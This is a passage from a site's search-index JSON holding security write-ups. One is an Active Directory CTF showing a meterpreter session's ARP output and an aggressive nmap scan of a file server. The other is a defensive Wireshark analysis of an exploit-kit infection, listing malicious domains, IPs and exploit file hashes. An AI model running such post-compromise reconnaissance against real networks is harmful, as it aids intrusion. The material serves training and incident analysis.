winPEAS.exe on Users Information , there is only enterprise admin who is abu . Answer: abu","title":"Q8\u200a-\u200aEnterprise Admins"},{"location":"writeup/ctf-round-3-active-directory/#challenges-file-server","text":"","title":"Challenges\u200a-\u200aFile Server"},{"location":"writeup/ctf-round-3-active-directory/#q1-ip-address-of-file-server","text":"On the meterpreter, I ran arp to display the host ARP cache. meterpreter > arp ARP cache ========= IP address MAC address Interface ---------- ----------- --------- 192.168.240.1 00:0c:29:4c:f2:d9 12 192.168.240.13 00:50:56:ab:40:8b 12 192.168.240.30 00:0c:29:3b:05:22 12 192.168.240.255 ff:ff:ff:ff:ff:ff 12 224.0.0.22 00:00:00:00:00:00 1 224.0.0.22 01:00:5e:00:00:16 12 224.0.0.252 01:00:5e:00:00:fc 12 I tried to nmap each of the address. The 1st address gives nothing. Then move on to the next one, it has hostname included fsrv . $ nmap -Pn -A 192.168.240.13 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 03:41 +08 Nmap scan report for 192.168.240.13 Host is up (0.055s latency). Not shown: 995 filtered ports PORT STATE SERVICE VERSION 111/tcp closed rpcbind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=prod-fsrv5633.mycoms.com.local | Not valid before: 2020-11-02T10:27:27 |_Not valid after: 2021-05-04T10:27:27 |_ssl-date: 2020-11-21T19:42:09+00:00; -12s from scanner time. Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -12s, deviation: 0s, median: -12s |_nbstat: NetBIOS name: PROD-FSRV5633, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:40:8b (VMware) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-11-21T19:41:29 |_ start_date: 2020-11-03T10:27:26 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.07 seconds Answer: 192.168.240.13","title":"Q1 - IP address of file server"},{"location":"writeup/ctf-round-3-active-directory/#q2-folder-share-name-that-domain-user-has-write-access-to-file-server","text":"","title":"Q2 - Folder share name that 'domain user' has write access to file server"},{"location":"writeup/ctf-round-3-active-directory/#q3-ntlm-hash-result-for-user-administrator","text":"","title":"Q3 - NTLM hash result for user Administrator"},{"location":"writeup/ctf-round-3-active-directory/#q4-ntlm-hash-result-for-user-mar","text":"","title":"Q4 - NTLM hash result for user \"*mar\""},{"location":"writeup/ctf-round-3-active-directory/#q5-plain-text-password-for-user-administrator_1","text":"to be continue ...","title":"Q5 - Plain text password for user Administrator"},{"location":"writeup/malware-traffic-analysis-1-pcap/","text":"This is the write-up of Malware Traffic Analysis 1 \u2014 PCAP by Brad Duncan on CyberDefenders . Given a PCAP file named mta1.pcap which containing 3053 packets. I need to answer the following questions based on the PCAP file: What is the IP address of the Windows VM that gets infected? What is the host name of the Windows VM that gets infected? What is the MAC address of the infected VM? What is the IP address of the compromised web site? What is the domain name of the compromised web site? What is IP address of the server that delivered the exploit kit and malware? What is the domain name that delivered the exploit kit and malware? What is the redirect URL that points to the exploit kit (EK) landing page? Other than CVE-2013\u20132551 IE exploit, what other exploit(s) sent by the EK? How many times was the payload delivered? What are the SIDs of the triggered Snort alerts? The compromised website has the malicious script with a URL. What is this URL? Extract the exploit file(s). What is (are) the MD5 file hash(es)? VirusTotal doesn\u2019t show how many times a specific rule was fired under the \u201cSuricata alerts\u201d section for the pcap analysis. Run the pcap file against your local Suricata (Emerging Threats Open ruleset) and provide the rule number that was fired the most. First thing to do is to have an overview of what network traffic is present in a PCAP file. To do this go to Statistics > Protocol Hierarchy . This provides a good overview of different protocols that are present. This can also help identify any abnormal protocol activity that might stick out. From the Protocol Hierarchy , I see some HTTP (Hypertext Transfer Protocol) activity, so I will filter this in Wireshark to view HTTP traffic. The source of all traffic is 172.16.165.165 . Therefore, I can assume that this is the infected VM. What is the IP address of the Windows VM that gets infected? 172.16.165.165 To know the host name of the Windows VM that gets infected, I use bootp filter in Wireshark to display DHCP traffic and view more information on the infected host ( 172.16.165.165 ). The screenshot above shows the MAC address and host name of the infected host. What is the host name of the Windows VM that gets infected? K34EN6W3N-PC What is the MAC address of the infected VM? f0:19:af:02:9b:f1 From the output of display filter http.request , it can be seen that the infected host communicates with the following remote domains: bing.com ciniholland.nl adultbiz.in ytimg.l.google.com (don\u2019t know what is this domain) 24corp-shop.com stand.trustandprobaterealty.com The user lands on www.ciniholland.nl through a Bing search result. This is evident from the Referer field in the HTTP header. When inspect the source code of ciniholland.nl/index.html , there is an invisible iframe being created in line 59 with source URL 24corp-shop.com . This suggests that the website www.ciniholland.nl (IP address: 82.150.140.30 ) is compromised. What is the IP address of the compromised web site? 82.150.140.30 What is the domain name of the compromised web site? www.ciniholland.nl I follow the GET requests using http.request.method filter and see that the final website initiates downloads on the now compromised machine. Its IP address is 37.200.69.143 . What is IP address of the server that delivered the exploit kit and malware? 37.200.69.143 What is the domain name that delivered the exploit kit and malware? stand.trustandprobaterealty.com As I checked the GET request , I found out that the referer to the first EK landing page (stand.trustandprobaterealty.com) was 24corp-shop.com . What is the redirect URL that points to the exploit kit (EK) landing page? 24corp-shop.com By checking the the HTML object ( File > Export Object > HTTP ), I can see two other exploits which are Flash and Java. Other than CVE-2013\u20132551 IE exploit, what other exploit(s) sent by the EK? flash,java Referring to the application/x-msdownload , it being delivered 3 times. How many times was the payload delivered? 3 I uploaded the PCAP file to VirusTotal and check the Snort Alerts . Here\u2019s what I found. What are the SIDs of the triggered Snort alerts? 25562,27816,30934,30936 The compromised website has the malicious script with a URL. What is this URL? 24corp-shop.com I extract the both exploit files which are flash and java and check their MD5 file hash using md5sum . Extract the exploit file(s). What is (are) the MD5 file hash(es)? 7b3baa7d6bb3720f369219789e38d6ab,1e34fdebbf655cebea78b45e43520ddf Based on the Suricata Alerts, there is 1 rule that alerted 3 times ( ET CURRENT_EVENTS GoonEK encrypted binary ). VirusTotal doesn\u2019t show how many times a specific rule was fired under the \u201cSuricata alerts\u201d section for the pcap analysis. Run the pcap file against your local Suricata (Emerging Threats Open ruleset) and provide the rule number that was fired the most. 2018297","title":"Malware Traffic Analysis 1 - PCAP"}]}